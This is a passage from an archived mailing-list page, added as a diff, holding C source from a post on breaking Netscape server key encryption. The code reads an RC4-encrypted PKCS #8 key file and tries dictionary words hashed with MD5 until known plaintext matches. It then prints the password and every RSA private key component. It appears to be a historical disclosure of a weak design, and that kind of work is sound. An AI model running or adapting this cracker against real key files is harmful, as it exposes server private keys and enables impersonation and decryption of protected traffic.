+	if( ( keyFile = fopen( argv[ 1 ], "rb" ) ) == NULL )
+		{
+		perror( argv[ 1 ] );
+		return( EXIT_FAILURE );
+		}
+
+	/* Read the Netscape outer wrapper */
+	if( getc( keyFile ) != 0x30 )
+		{
+		puts( "This doesn't look like a Netscape server key file." );
+		exit( EXIT_FAILURE );
+		}
+	count = getc( keyFile ) &amp; 0x7F;
+	while( count-- )
+		getc( keyFile );
+	if( ( fread( buffer, 1, 13, keyFile ) != 13 ) || \
+		memcmp( buffer, netscapeKeyfileID, 13 ) )
+		{
+		puts( "This doesn't look like a Netscape server key file." );
+		exit( EXIT_FAILURE );
+		}
+
+	/* Read the PKCS #8 EncryptedPrivateKey wrapper */
+	if( getc( keyFile ) != 0x30 )
+		{
+		puts( "This doesn't look like a Netscape server key file." );
+		exit( EXIT_FAILURE );
+		}
+	count = getc( keyFile ) &amp; 0x7F;
+	while( count-- )
+		getc( keyFile );
+	if( ( fread( buffer, 1, 14, keyFile ) != 14 ) || \
+		memcmp( buffer, rc4EncryptionID, 14 ) )
+		{
+		puts( "This doesn't look like an RC4-encrypted server key." );
+		exit( EXIT_FAILURE );
+		}
+
+	/* Read the start of the EncryptedData field */
+	if( getc( keyFile ) != 0x04 )
+		{
+		puts( "This doesn't look like a Netscape server key file." );
+		exit( EXIT_FAILURE );
+		}
+	count = getc( keyFile ) &amp; 0x7F;
+	while( count-- )
+		length = ( length &lt;&lt; 8 ) | getc( keyFile );
+
+	/* Read the encrypted RSAPrivateKey */
+	if( fread( buffer, 1, length, keyFile ) != length )
+		{
+		puts( "Netscape server key file length fields are inconsistent." );
+		exit( EXIT_FAILURE );
+		}
+	fclose( keyFile );
+
+	/* We've got the data we want, now rumble through the dictionary trying
+	   each key on it.  First, make sure we can open the thing */
+	if( ( dictFile = fopen( argv[ 2 ], "r" ) ) == NULL )
+		{
+		perror( argv[ 2 ] );
+		return( EXIT_FAILURE );
+		}
+
+	while( TRUE )
+		{
+		BYTE hashedPassword[ MD5_DIGESTSIZE ], *hashedPassPtr = hashedPassword;
+		MD5_INFO md5Info;
+		RC4KEY rc4key;
+		char dictWord[ 100 ];
+		int dictWordLength, index;
+
+		/* Get the next word from the dictionary */
+		if( fgets( dictWord, 100, dictFile ) == NULL )
+			{
+			puts( "No more words in dictionary." );
+			break;
+			}
+		dictWordLength = strlen( dictWord ) - 1;
+		dictWord[ dictWordLength ] = '\0';
+
+		/* Hash the word using MD5 */
+		md5Initial( &amp;md5Info );
+		md5Update( &amp;md5Info, ( BYTE * ) dictWord, dictWordLength );
+		md5Final( &amp;md5Info );
+		for( index = 0; index &lt; MD5_DIGESTSIZE / 4; index++ )
+			{
+			mputLLong( hashedPassPtr, md5Info.digest[ index ] );
+			}
+
+		/* Set up the RC4 key based on the hashed password */
+		rc4ExpandKey( &amp;rc4key, hashedPassword, MD5_DIGESTSIZE );
+
+		/* Copy the data to a temporary buffer and try to decrypt it */
+		memcpy( temp, buffer, length );
+		rc4Crypt( &amp;rc4key, temp, 22 );
+
+		/* Check for known plaintext */
+		if( temp[ 0 ] != 0x30 || !( temp[ 1 ] &amp; 0x80 ) )
+			continue;
+		index = 1;
+		count = temp[ index++ ] &amp; 0x7F;
+		while( count-- )
+			index++;
+		if( memcmp( temp + index, version, 3 ) )
+			continue;
+		index += 3;
+		if( memcmp( temp + index, rsaPrivateKeyID, 15 ) )
+			continue;
+
+		/* We've found the password, display it and decrypt the rest of
+		   the key */
+		printf( "The password used to encrypt this Netscape server key "
+				"is '%s'.\n\n", dictWord );
+		index += 15;
+		rc4Crypt( &amp;rc4key, temp + 22, length - 22 );
+
+		/* Skip the OCTET STRING encapsulation */
+		if( temp[ index++ ] != 0x04 )
+			{
+			/* Should never happen */
+			puts( "Bad data format in key file" );
+			break;
+			}
+		count = temp[ index++ ] &amp; 0x7F;
+		while( count-- )
+			index++;
+
+		/* Skip the inner SEQUENCE encapsulation */
+		if( temp[ index++ ] != 0x30 )
+			{
+			/* Should never happen */
+			puts( "Bad data format in key file" );
+			break;
+			}
+		count = temp[ index++ ] &amp; 0x7F;
+		while( count-- )
+			index++;
+
+		/* Skip the version number.  NB: This encoding is incorrect and
+		   violates the ASN.1 encoding rules.  It's strange that the outer
+		   version number is encoded correctly, but the inner one isn't */
+		if( temp[ index++ ] != 0x02 || temp[ index++ ] != 0x00 )
+			{
+			/* Should never happen */
+			puts( "Bad data format in key file" );
+			break;
+			}
+
+		/* OK, now we've reached the key components.  Print each one out */
+		index += printKeyComponent( temp + index, "Modulus" );
+		index += printKeyComponent( temp + index, "Public exponent" );
+		index += printKeyComponent( temp + index, "Private exponent" );
+		index += printKeyComponent( temp + index, "Prime 1" );
+		index += printKeyComponent( temp + index, "Prime 2" );
+		index += printKeyComponent( temp + index, "Exponent 1" );
+		index += printKeyComponent( temp + index, "Exponent 2" );
+		index += printKeyComponent( temp + index, "Coefficient" );
+
+		break;
+		}
+	fclose( dictFile );
+
+	return( EXIT_SUCCESS );
+	}
+
+
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<UL><LI><STRONG>Follow-Ups</STRONG>:
+<UL>
+<LI><STRONG><A NAME="02216" HREF="msg02216.html">Re: [Long] How to break Netscape's server key encryption</A></STRONG>
+<UL><LI><EM>From:</EM> Jeff Weinstein &lt;jsw@netscape.com&gt;</LI></UL></LI>
+</UL></LI></UL>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg02294.html">Euro-Commission to tackle porn on Internet</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg02217.html">Re: Bernstein hearing: The Press Release</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg02294.html">Euro-Commission to tackle porn on Internet</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg02216.html">Re: [Long] How to break Netscape's server key encryption</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#02300"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#02300"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
